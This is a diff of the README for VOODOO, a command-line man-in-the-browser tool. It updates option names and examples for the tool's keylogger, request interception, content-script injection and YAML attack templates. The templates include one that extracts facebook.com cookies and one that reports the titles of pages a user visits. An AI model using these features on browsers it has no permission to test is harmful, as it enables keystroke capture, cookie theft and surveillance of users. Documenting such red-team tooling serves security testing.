@@ -45,30 +45,34 @@ Make sure you have `/Users/[user]/.gem/ruby/[version]/bin` in your `PATH`.
 $: voodoo
 Commands:
   voodoo help [COMMAND]    # Describe available commands or one specific command
-  voodoo intercept         # intercept browser requests
-  voodoo keylogger         # records user keystrokes
-  voodoo script <js/path>  # add a content script
-  voodoo template <path>   # execute a VOODOO template
+  voodoo intercept         # Intercept browser requests
+  voodoo keylogger         # Records user keystrokes
+  voodoo script <js/path>  # Add a content script
+  voodoo template <path>   # Execute a VOODOO template
   voodoo version           # Prints voodoo version
 ```
 
 ## Adding content script
 
 ```sh
+$: voodoo help script
 Usage:
   voodoo script <js/path>
 
 Options:
   x, [--urls=one two three]         
-  o, [--output=OUTPUT]              # collector output file path
-  j, [--js-vars=key:value]          # localizes JavaScript variable
+  f, [--format=FORMAT]              # pretty, json, payload, none
+                                    # Default: pretty
+  o, [--output=OUTPUT]              # File path
+  p, [--params=key:value]           
   m, [--matches=one two three]      
                                     # Default: ["*://*/*"]
   b, [--browser=BROWSER]            
                                     # Default: chrome
   p, [--permissions=one two three]  
+      [--max-events=N]              
 
-add a content script
+Add a content script
 ```
 
 Execute JS on every page loaded on the Opera browser.
@@ -83,12 +87,13 @@ $: voodoo script "alert('Example VOODOO!');" -b chrome -m "https://example.com/*
 
 Execute JS on every page loaded on Google Chrome, and open `https://example.com`.
 ```js
-$: voodoo script /tmp/myjs.js -b chrome -s "https://example.com"
+$: voodoo script /tmp/myjs.js -b chrome -x "https://example.com"
 ```
 
 ## Intercept browser traffic
 
 ```sh
+$: voodoo help intercept
 Usage:
   voodoo intercept
 
@@ -96,15 +101,17 @@ Options:
   u, [--url-include=URL_INCLUDE]      
   b, [--body-include=BODY_INCLUDE]    
   h, [--header-exists=HEADER_EXISTS]  
-  o, [--output=OUTPUT]                # <path>, stdout
-                                      # Default: stdout
+  f, [--format=FORMAT]                # pretty, json, payload
+                                      # Default: pretty
+  o, [--output=OUTPUT]                # File path
   x, [--urls=one two three]           
   m, [--matches=one two three]        
                                       # Default: ["<all_urls>"]
   b, [--browser=BROWSER]              
                                       # Default: chrome
+      [--max-events=N]                
 
-intercept browser requests
+Intercept browser requests
 ```
 
 Intercept all requests
@@ -129,19 +136,22 @@ $: voodoo intercept -m "https://example.com/*" "https://example.net/*"
 
 ## Keylogger
 ```sh
+$: voodoo help keylogger
 Usage:
   voodoo keylogger
 
 Options:
   x, [--urls=one two three]     
-  o, [--output=OUTPUT]          # <path>, stdout
-                                # Default: stdout
+  f, [--format=FORMAT]          # pretty, json, payload
+                                # Default: pretty
+  o, [--output=OUTPUT]          # File path
   m, [--matches=one two three]  
                                 # Default: ["*://*/*"]
   b, [--browser=BROWSER]        
                                 # Default: chrome
+      [--max-events=N]          
 
-records user keystrokes
+Records user keystrokes
 ```
 
 Record user keys only when the url matches `https://example.com/*`
@@ -151,36 +161,38 @@ $: voodoo keylogger -m "https://example.com/*"
 
 ## Templates
 
-A VOODOO template is a `YAML` file that is used to define one or more script injections.
+A VOODOO template is a `YAML` file that is used to define a man in the browser attack.
 
 ```sh
+$: voodoo help template
 Usage:
   voodoo template <path>
 
 Options:
   b, [--browser=BROWSER]     
-  o, [--output=OUTPUT]       # none, <path>, stdout, stdout:payload
+  f, [--format=FORMAT]       # json, payload, none
                              # Default: none
+  o, [--output=OUTPUT]       # File path
   x, [--urls=one two three]  
-  j, [--js-vars=key:value]   # localizes JavaScript variable
+  p, [--params=key:value]    
+      [--max-events=N]       
 
-execute a VOODOO template
+Execute a VOODOO template
 ```
 
-A template must have have 3 main blocks: `info`, `scripts`, and `browser` and 2 optional settings `output` and `permissions`.
+A template must have have 3 main blocks: `info`, `scripts`, and `browser` and 2 optional settings `format` and `permissions`.
 
 ### Information
 
-The `info` block holds important information about your template. Info block provides `name`, `author`, `description`, and `tags`.
+The `info` block holds important information about your template. Info block provides `name`, `author`, and `description`.
 `info` block also supports dynamic fields, so you can define any key: value blocks to provide more useful information about the template.
 
 Info block example:
 ```yaml
 info:
   name: Change the Title of example.com
-  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.
   author: Mr. Test
-  tags: example.com, overwrite
+  description: Overwrite the contents of the h1 tag in example.com every time the user visits it.
 ```
 
 ### Scripts
@@ -189,7 +201,7 @@ You can spesify the following attributes for each script:
 
 | Name      | Type      | Description |
 | --------- | --------- | --------- | 
-`matches` | array of strings | **Required for content scripts** Specifies which pages this content script will be injected into. |
+`matches` | array of strings | Specifies which pages this content script will be injected into. |
 `content` | string | Specifies the JavaScript code that will be executed
 `file` | string | Specifies the path to a JavaScript file that will be executed
 `background` | boolean | Specifies whether or not this is a background script
@@ -226,7 +238,6 @@ info:
   name: Change the Title of example.com
   author: Mr. Test
   description: Overwrite the contents of the h1 tag in example.com every time the user visits it.
-  tags: example.com, overwrite
 
 scripts:
   - matches: https://example.com/*
@@ -242,11 +253,8 @@ browser:
 ### JavaScript API
 Every content script and background script can access the `VOODOO` object.
 
-`VOODOO.options` is an is a key value settings pass from CLI `js_vars` option.
-Please note, `VOODOO.options.collector_url` is automatically set.
-
 `VOODOO.send(:any)` is a method that allows you to send information back to the CLI/Ruby.
-When using `VOODOO.send` make sure to set `output` to one of the following: `stdout`, `stdout:payload`, `<path-to-file>`
+When using `VOODOO.send` make sure the `format` is not `none`.
 
 ### Permissions
 The `permissions` property is used to declare the necessary permissions for your VOODOO script.
@@ -258,7 +266,7 @@ Adding the `cookies` permission, to extract `facebook.com` cookies from the brow
 info:
   name: Cookie Monster
 
-output: stdout:payload
+format: payload
 
 permissions:
   - cookies
@@ -272,28 +280,26 @@ scripts:
 ### Browser
 The `browser` block is a key value object that defines browser related settings for the template.
 Please note, the `name` setting can be overwrited using the `--browser` or `-b` CLI option.
-The `urls` setting can be overwrited using the `--urls` or `-x` CLI options.
+The `urls` setting can also be overwrited using the `--urls` or `-x` CLI options.
 
 | Name      | Type      | Description | Default | 
 | --------- | --------- | --------- | --------- |
 | name      | string    | supported browser short name `chrome`, `opera`, `edge`, `brave`, `chromium` | `chrome`
 | urls      | array of strings | list of urls to open right after we hijack the browser. | `NULL`
 
-### Output
-The `output` property sets the default output format for the template.
-Please note, this setting can be overwrited using the `--output` or `-o` CLI option.
+### Format
+The `format` property sets the default output format for the template.
+Please note, this setting can be overwrited using the `--format` or `-f` CLI option.
 
 ```yaml
 info:
   name: Title Spy
+  description: Extract the title from any https site the user visits
 
-# sets the default output format
-output: stdout:payload # -> prints only the sent payload
-       # stdout          -> prints the full event
-       # <file path>     -> save the full event to a file
+format: payload
 
 scripts:
-  - matches: https://example.net
+  - matches: https://*/*
     content: 'VOODOO.send({title: document.title})'
 
 browser:
